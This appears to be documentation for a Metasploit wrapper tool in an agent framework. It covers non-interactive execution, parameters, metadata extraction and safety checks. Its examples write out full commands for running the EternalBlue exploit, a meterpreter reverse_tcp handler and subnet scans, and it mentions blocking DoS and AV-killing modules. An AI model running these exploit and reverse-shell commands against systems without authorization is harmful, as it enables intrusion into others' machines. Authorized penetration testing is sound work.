# msfconsole

Metasploit Framework penetration testing tool

**Version:** 1.0.0
**Author:** Wish Framework Team
**Category:** exploitation
**Tags:** exploitation, pentesting, vulnerability, msf, metasploit

## Requirements

- metasploit-framework

## Features

### Non-Interactive Execution

The tool runs msfconsole in non-interactive mode using the `-x` flag for command execution. Commands are automatically terminated with `exit -y` for clean shutdown.

### Tool Parameters Support

The tool supports both traditional command strings and structured tool parameters for command generation. When `tool_parameters` are provided with a `module` key, commands are built automatically from the parameters.

### Session Management

Automatically detects and reports session creation in the metadata, including session IDs when Metasploit sessions are opened.

### Timeout Configuration

- Default timeout: 600 seconds for exploits, 300 seconds for auxiliary modules
- Configurable timeout via `timeout_sec` parameter
- Proper timeout handling with process termination

### Output Analysis

Intelligent success/failure detection based on:

- Exit codes
- Output content analysis for success indicators (Session opened, Exploit completed)
- Failure detection (Exploit failed, Connection refused, etc.)

## Capabilities

### exploit

Run an exploit module against target(s)

**Parameters:**

- `module`: The exploit module path (e.g., exploit/windows/smb/ms17_010_eternalblue)
- `rhosts`: Target host(s) - IP address or range
- `rport`: Target port (optional, module default used if not specified)
- `payload`: Payload to use (optional, module default used if not specified)
- `lhost`: Local host for reverse connection (required for reverse payloads)
- `lport`: Local port for reverse connection (optional, default: 4444)
- `options`: Additional module options as key-value pairs (optional)

**Default Timeout:** 600 seconds

**Examples:**

```bash
use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; set LHOST 192.168.1.10; exploit
```

```bash
use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.10; exploit
```

### auxiliary

Run an auxiliary module (scanners, fuzzers, etc.)

**Parameters:**

- `module`: The auxiliary module path (e.g., auxiliary/scanner/smb/smb_version)
- `rhosts`: Target host(s) - IP address or range
- `rport`: Target port (optional)
- `options`: Additional module options as key-value pairs (optional)

**Default Timeout:** 300 seconds

**Examples:**

```bash
use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run
```

```bash
use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.100; set PORTS 1-1000; run
```

### search

Search for modules by name, platform, or CVE

**Parameters:**

- `query`: Search query (module name, CVE, platform, etc.)
- `type`: Module type filter (optional: exploit, auxiliary, post, payload)

**Default Timeout:** 60 seconds

**Examples:**

```bash
search type:exploit platform:windows smb
```

```bash
search cve:2017-0144
```

```bash
search apache struts
```

### info

Get detailed information about a module

**Parameters:**

- `module`: Full module path to get information about

**Default Timeout:** 30 seconds

**Examples:**

```bash
info exploit/windows/smb/ms17_010_eternalblue
```

```bash
info auxiliary/scanner/smb/smb_version
```

## Command Generation

The tool supports two modes of command generation:

### 1. Traditional Command String

```python
CommandInput(command="use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; exploit")
```

### 2. Tool Parameters (Recommended)

```python
CommandInput(
    command="exploit",
    tool_parameters={
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "rhosts": "192.168.1.100",
        "lhost": "192.168.1.10"
    }
)
```

When tool parameters are provided, the tool automatically builds the command sequence using `generate_command()` method.

## Metadata Extraction

The tool extracts the following metadata from msfconsole output:

- **session_id**: Session ID when a session is opened
- **session_opened**: Boolean indicating if a session was created
- **module**: Module name used in the execution
- **targets**: Target hosts (RHOSTS value)
- **payload**: Payload used in exploit
- **matching_modules**: Number of modules found in search results
- **vulnerable**: Boolean indicating if target appears vulnerable (auxiliary scans)

## Safety Features

### Command Validation

- Validates commands contain only allowed msfconsole commands
- Blocks potentially dangerous modules (DoS, AV killing)
- Ensures proper command structure

### Process Management

- Automatic process cleanup on timeout
- Proper signal handling for process termination
- Working directory isolation

### Parameter Mapping

Automatic mapping from tool parameter names to MSF parameter names:

- `rhosts` → `RHOSTS`
- `lhost` → `LHOST`
- `lport` → `LPORT`
- `rport` → `RPORT`
- `payload` → `PAYLOAD`

## Error Handling

- Connection failures properly detected
- Timeout handling with graceful termination
- Module not found errors
- Invalid parameter errors
- Process execution errors
